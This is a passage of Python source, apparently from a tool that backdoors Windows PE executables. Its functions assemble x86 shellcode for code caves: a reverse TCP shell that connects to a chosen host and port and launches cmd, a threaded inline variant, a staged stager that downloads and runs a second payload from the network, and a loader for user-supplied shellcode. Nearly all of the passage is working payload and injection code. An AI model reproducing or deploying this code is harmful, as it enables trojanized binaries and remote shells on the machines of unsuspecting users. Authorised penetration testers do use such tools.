            if flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))

        self.shellcode1 += "\x01\xD1"  # add ECX + EDX

        self.shellcode1 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                            "\x95\x6A\x05\x68")
        self.shellcode1 += self.pack_ip_addresses()          # HOST
        self.shellcode1 += "\x68\x02\x00"
        self.shellcode1 += struct.pack('!H', self.PORT)      # PORT
        self.shellcode1 += ("\x89\xE2\x6A"
                            "\x10\x52\x51\x87\xF9\xFF\xD5"
                            )

        #breakupvar is the distance between codecaves
        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"  # JMP opcode
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                                 len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)

        self.shellcode2 = ("\x6A\x00\x68\x65\x6C"
                           "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
                           "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
                           "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
                           "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
                           "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
                           "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
                           "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
                           "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
                           "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46\x89\xD4"
                           "\xFF\x32\x96\xFF\xD5\x81\xC4\x34\x02\x00\x00"
                           )

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore
        return (self.stackpreserve + self.shellcode1, self.shellcode2 + self.stackrestore)

    def iat_reverse_tcp_inline_threaded(self, flItms, CavesPicked={}):
        """
        Non-staged iat based payload.
        """

        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
                                 'VirtualAlloc', 'CreateThread']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        flItms['stager'] = True

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if flItms['XP_MODE'] is True:
                xp_offset = 0
            else:
                xp_offset = 11
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"

        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 58

        self.shellcode2 += ("\xFC"
                            "\x60"                          # pushal
                            "\x89\xe5"                      # mov ebp, esp
                            "\x31\xd2"                      # xor edx, edx
                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                            # entry point is now in edx
                            )
        self.shellcode2 += "\xbb"           # mov value below to EBX
        if flItms['LoadLibraryA'] - (flItms['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['ImageBase']))

        self.shellcode2 += "\x01\xD3"   # add EBX + EDX
        self.shellcode2 += "\xb9"       # mov value below to ECX

        if flItms['GetProcAddress'] - (flItms['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['ImageBase']))
        self.shellcode2 += "\x01\xD1"   # add ECX + EDX

        self.shellcode2 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                            "\x95\x6A\x05\x68"
                            )
        self.shellcode2 += self.pack_ip_addresses()          # HOST
        self.shellcode2 += "\x68\x02\x00"
        self.shellcode2 += struct.pack('!h', self.PORT)      # PORT
        self.shellcode2 += ("\x89\xE2\x6A"
                            "\x10\x52\x51\x87\xF9\xFF\xD5"
                            )

        self.shellcode2 += ("\x85\xC0\x74\x00\x6A\x00\x68\x65\x6C"
                            "\x33\x32\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x73\x41\x00\x00\x68"
                            "\x6F\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43\x72\x65\x61\x54\x50"
                            "\xFF\x16\x95\x93\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x87\xFE"
                            "\x92\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01"
                            "\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4E\x56"
                            "\x56\x53\x56\x87\xDA\xFF\xD5\x89\xE6\x6A\x00\x68\x65\x6C\x33\x32"
                            "\x68\x6B\x65\x72\x6E\x54\xFF\x13\x68\x65\x63\x74\x00\x68\x65\x4F"
                            "\x62\x6A\x68\x69\x6E\x67\x6C\x68\x46\x6F\x72\x53\x68\x57\x61\x69"
                            "\x74\x54\x50\x95\xFF\x17\x95\x89\xF2\x31\xF6\x4E\x56\x46"  # \x89\xD4"
                            "\xFF\x32\x96\xFF\xD5"  # \x81\xC4\x34\x02\x00\x00"
                            )

        # ExitFunc
        # Just try exitthread...
        self.shellcode2 += ("\x68\x6f\x6e\x00\x00"
                            "\x68\x65\x72\x73\x69"
                            "\x68\x47\x65\x74\x56"  # GetVersion
                            "\x54"                  # push esp
                            "\x56"                  # push esi
                            "\xff\x17"              # call dword ptr ds: [edi] ; getprocaddress
                            "\xff\xd0"              # call eax ; getversion
                            "\x3c\x06"              # cmp al, 6
                            "\x7D\x13"              # jl short
                            "\x68\x61\x64\x00\x00"  # ...
                            "\x68\x54\x68\x72\x65"  # ...
                            "\x68\x45\x78\x69\x74"  # ExitThread
                            "\x54"                  # push esp
                            "\x56"                  # push ebp (kernel32)
                            "\xeb\x28"              # jmp short to push getprocaddress
                            "\x68\x6c\x00\x00\x00"              # ...
                            "\x68\x6e\x74\x64\x6c"  # ntdll
                            "\x54"                  # push esp
                            "\xff\x13"              # call dword ptr ds:[ebx] loadliba
                            "\x68\x64\x00\x00\x00"              # ...
                            "\x68\x68\x72\x65\x61"  # ...
                            "\x68\x73\x65\x72\x54"  # ...
                            "\x68\x78\x69\x74\x55"  # ...
                            "\x68\x52\x74\x6c\x45"  # RtlExitUserThread
                            "\x54"                  # push esp
                            "\x50"                  # push eax
                            "\xff\x17"              # call getprocessaddress
                            "\x6a\x00"              # push 0
                            "\xff\xd0"              # call eax
                            )

        breakupvar = eat_code_caves(flItms, 0, 1)
        #starts the VirtualAlloc/CreateThread section for the PAYLOAD
        self.shellcode1 = "\xFC"  # Cld
        if flItms['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        self.shellcode1 += "\xbb"           # mov value below to EBX
        #Put VirtualAlloc in EBX
        if flItms['XP_MODE'] is True:
            if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + flItms['VirtualAlloc'] - flItms['ImageBase'] + 1)
            else:
                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - flItms['ImageBase'])
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['CreateThread'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - flItms['ImageBase']) + 1)
            else:
                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - flItms['ImageBase'])
        else:
            if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))

        #Add in memory base
        self.shellcode1 += "\x01\xD1"  # add ECX + EDX
        self.shellcode1 += "\x8B\xE9"  # mov EDI, ECX for save keeping

        self.shellcode1 += "\xBE"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)

        self.shellcode1 += ("\x00\x00"
                            "\x6A\x40"
                            "\x68\x00\x10\x00\x00"
                            "\x56"
                            "\x6A\x00")
        self.shellcode1 += "\xff\x13"                      # call dword ptr [ebx]
        self.shellcode1 += ("\x89\xC3"
                            "\x89\xC7"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x16"  # <--length of shellcode below

        self.shellcode1 += "\x5e"
        self.shellcode1 += ("\xF2\xA4"
                            "\x31\xC0"
                            "\x50"
                            "\x50"
                            "\x50"
                            "\x53"
                            "\x50"
                            "\x50"
                            )

        self.shellcode1 += "\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
        self.shellcode1 += ("\x58"
                            "\x61"                  # POP AD
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def iat_reverse_tcp_stager_threaded(self, flItms, CavesPicked={}):
        """
        Staged iat based payload.
        """

        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
                                 'VirtualAlloc', 'CreateThread']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        if self.PORT is None:
            print ("This payload requires the PORT parameter -P")
            return False

        if self.HOST is None:
            print "This payload requires a HOST parameter -H"
            return False

        flItms['stager'] = True

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if flItms['XP_MODE'] is True:
                xp_offset = 0
            else:
                xp_offset = 11
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"

        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 58

        self.shellcode2 += ("\xFC"
                            "\x60"                          # pushal
                            "\x89\xe5"                      # mov ebp, esp
                            "\x31\xd2"                      # xor edx, edx
                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                            # entry point is now in edx
                            )
        self.shellcode2 += "\xbb"                           # mov value below to EBX
        if flItms['LoadLibraryA'] - (flItms['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['LoadLibraryA'] - (flItms['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", flItms['LoadLibraryA'] - (flItms['ImageBase']))

        self.shellcode2 += "\x01\xD3"                       # add EBX + EDX
        self.shellcode2 += "\xb9"                           # mov value below to ECX

        if flItms['GetProcAddress'] - (flItms['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['GetProcAddress'] - (flItms['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", flItms['GetProcAddress'] - (flItms['ImageBase']))
        self.shellcode2 += "\x01\xD1"                       # add ECX + EDX
        #LoadLibraryA in EBX
        #GetProcAddress in ECX

        self.shellcode2 += ("\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x87\xF1\xFF\x13\x68"
                            "\x75\x70\x00\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54\x50"
                            "\x97\xFF\x16\x95\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x90\x90\xFF\xD5\x68"
                            "\x74\x41\x00\x00\x68\x6F\x63\x6B\x65\x68\x57\x53\x41\x53\x54\x57"
                            "\xFF\x16\x95\x31\xC0\x50\x50\x50\x50\x40\x50\x40\x50\xFF\xD5\x95"
                            "\x68\x65\x63\x74\x00\x68\x63\x6F\x6E\x6E\x54\x57\xFF\x16\x87\xCD"
                            "\x95\x6A\x05\x68")
        self.shellcode2 += self.pack_ip_addresses()          # HOST
        self.shellcode2 += "\x68\x02\x00"
        self.shellcode2 += struct.pack('!H', self.PORT)      # PORT
        self.shellcode2 += ("\x89\xE2\x6A"
                            "\x10\x52\x51\x87\xF9\xFF\xD5"
                            )

        #breakupvar is the distance between codecaves
        #PART TWO
        #ESI getprocaddr
        #EBX loadliba
        #ESP ptr to sockaddr struct
        #EDI has the socket
        self.shellcode2 += ("\x89\xe5"              # mov edp, esp
                            "\x68\x33\x32\x00\x00"  # push ws2_32
                            "\x68\x77\x73\x32\x5F"  # ...
                            "\x54"                  # push esp
                            "\xFF\x13"              # call dword ptr [ebx]
                            "\x89\xc1"              # mov ecx, eax
                            "\x6A\x00"
                            "\x68\x72\x65\x63\x76"  # recv, 0
                            "\x54"                  # push esp
                            "\x51"                  # push ecx
                            "\xFF\x16"              # call dword ptr [esi]; get handle for recv
                            #save recv handle off
                            "\x50"                  # push eax; save revc handle for later
                            "\x6A\x00"              # push byte 0x0
                            "\x6A\x04"              # push byte 4
                            "\x55"                  # push ebp sockaddr struct
                            "\x57"                  # push edi (saved socket)
                            "\xff\xD0"              # call eax; recv (s, &dwLength, 4, 0)
                            #esp now points to recv handle
                            "\x8b\x34\x24"          # lea esi, [esp]
                            "\x8b\x6d\x00"          # mov ebp, dword ptr[ebp]
                            # Don't need loadliba/getprocaddr anymore
                            "\x31\xd2"                      # xor edx, edx
                            "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                            "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                            #entry point in EDX
                            )

        self.shellcode2 += "\xbb"           # mov value below to EBX

        #Put VirtualAlloc in EBX
        if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
            self.shellcode2 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['ImageBase']) + 1))
        else:
            self.shellcode2 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['ImageBase']))
        self.shellcode2 += "\x01\xD3"  # add EBX + EDX
        self.shellcode2 += ("\x6a\x40"              # push byte 0x40
                            "\x68\x00\x10\x00\x00"  # push 0x1000
                            "\x55"                  # push ebp
                            "\x6A\x00"              # push byte 0
                            "\xff\x13"              # Call VirtualAlloc from thunk
                            # do not need virualalloc anymore
                            "\x93"                  # xchg ebx, eax
                            "\x53"                  # push ebx ; mem location (return to it later)
                            "\x6a\x00"              # push byte 0
                            "\x55"                  # push ebp ; length
                            "\x53"                  # push ebx ; current address
                            "\x57"                  # push edi ; socket
                            "\xFF\xD6"              # call esi ; recv handle
                            "\x01\xc3"              # add ebx, eax
                            "\x29\xc5"              # sub ebp, eax
                            "\x75\xf3"              # jump back
                            "\xc3"                  # ret
                            )

        breakupvar = eat_code_caves(flItms, 0, 1)
        #starts the VirtualAlloc/CreateThread section for the PAYLOAD
        self.shellcode1 = "\xFC"  # Cld
        if flItms['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        self.shellcode1 += "\xbb"           # mov value below to EBX
        #Put VirtualAlloc in EBX
        if flItms['XP_MODE'] is True:
            if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + flItms['VirtualAlloc'] - flItms['ImageBase'] + 1)
            else:
                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - flItms['ImageBase'])
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['CreateThread'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - flItms['ImageBase']) + 1)
            else:
                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - flItms['ImageBase'])
        else:
            if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))

        #Add in memory base
        self.shellcode1 += "\x01\xD1"  # add ECX + EDX
        self.shellcode1 += "\x8B\xE9"  # mov EDI, ECX for save keeping

        self.shellcode1 += "\xBE"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += ("\x6A\x40"
                            "\x68\x00\x10\x00\x00"
                            "\x56"
                            "\x6A\x00")
        self.shellcode1 += "\xff\x13"                      # call dword ptr [ebx]
        self.shellcode1 += ("\x89\xC3"
                            "\x89\xC7"
                            "\x89\xF1"
                            )

        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x16"  # <--length of shellcode below

        self.shellcode1 += "\x5e"
        self.shellcode1 += ("\xF2\xA4"
                            "\x31\xC0"
                            "\x50"
                            "\x50"
                            "\x50"
                            "\x53"
                            "\x50"
                            "\x50"
                            )

        self.shellcode1 += "\x3E\xFF\x55\x00"      # Call DWORD PTR DS: [EBP]
        self.shellcode1 += ("\x58"
                            "\x61"                  # POP AD
                            )

        breakupvar = eat_code_caves(flItms, 0, 2)
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                             len(self.shellcode1) - 4).rstrip("L")), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                             breakupvar - len(self.stackpreserve) - 4).rstrip("L")), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip("L")), 16))
        else:
            self.shellcode1 += "\xe9"
            self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)

    def iat_user_supplied_shellcode_threaded(self, flItms, CavesPicked={}):
        """
        Staged
        """

        flItms['apis_needed'] = ['LoadLibraryA', 'GetProcAddress',
                                 'VirtualAlloc', 'CreateThread']

        for api in flItms['apis_needed']:
            if api not in flItms:
                return False

        flItms['stager'] = True

        if flItms['supplied_shellcode'] is None:
            print "[!] User must provide shellcode for this module (-U)"
            return False
        else:
            self.supplied_shellcode = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        #Begin shellcode 2:

        breakupvar = eat_code_caves(flItms, 0, 1)

        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if flItms['XP_MODE'] is True:
                xp_offset = 0
            else:
                xp_offset = 11
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                             len(self.shellcode2) + 57 - xp_offset).rstrip("L")), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                             breakupvar + 57 - xp_offset).rstrip("L")), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                   len(self.shellcode2) + 50 - xp_offset).rstrip("L")), 16))
        else:
            self.shellcode2 = "\xE8\xE5\xFF\xFF\xFF"

        #Can inject any shellcode below.

        if flItms['NewCodeCave'] is False:
            if CavesPicked != {}:
                self.shellcode2 += self.clean_caves_stub(flItms['CavesToFix'])

            else:
                self.shellcode2 += "\x41" * 58

        self.shellcode2 += self.supplied_shellcode

        breakupvar = eat_code_caves(flItms, 0, 1)

        self.shellcode1 = "\xFC"             # Cld
        if flItms['XP_MODE'] is True:
            self.shellcode1 += ("\x89\xe5"                      # mov ebp, esp
                                "\x31\xd2"                      # xor edx, edx
                                "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]
                                "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]
                                )
        self.shellcode1 += "\xbb"           # mov value below to EBX
        #Put VirtualAlloc in EBX
        if flItms['XP_MODE'] is True:
            if flItms['VirtualAlloc'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + flItms['VirtualAlloc'] - flItms['ImageBase'] + 1)
            else:
                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - flItms['ImageBase'])
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['CreateThread'] - (flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - flItms['ImageBase']) + 1)
            else:
                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - flItms['ImageBase'])
        else:
            if flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['VirtualAlloc'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))
            self.shellcode1 += "\x01\xD3"  # add EBX + EDX
            #Put Create Thread in ECX
            self.shellcode1 += "\xb9"  # mov value below to ECX
            if flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) < 0:
                self.shellcode1 += struct.pack("<I", 0xffffffff + (flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']) + 1))
            else:
                self.shellcode1 += struct.pack("<I", flItms['CreateThread'] - (flItms['AddressOfEntryPoint'] + flItms['ImageBase']))

        #Add in memory base
        self.shellcode1 += "\x01\xD1"               # add ECX + EDX
        self.shellcode1 += "\x8B\xE9"               # mov EDI, ECX for save keeping

        self.shellcode1 += "\xBE"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += ("\x6A\x40"
                            "\x68\x00\x10\x00\x00"
                            "\x56"
                            "\x6A\x00")
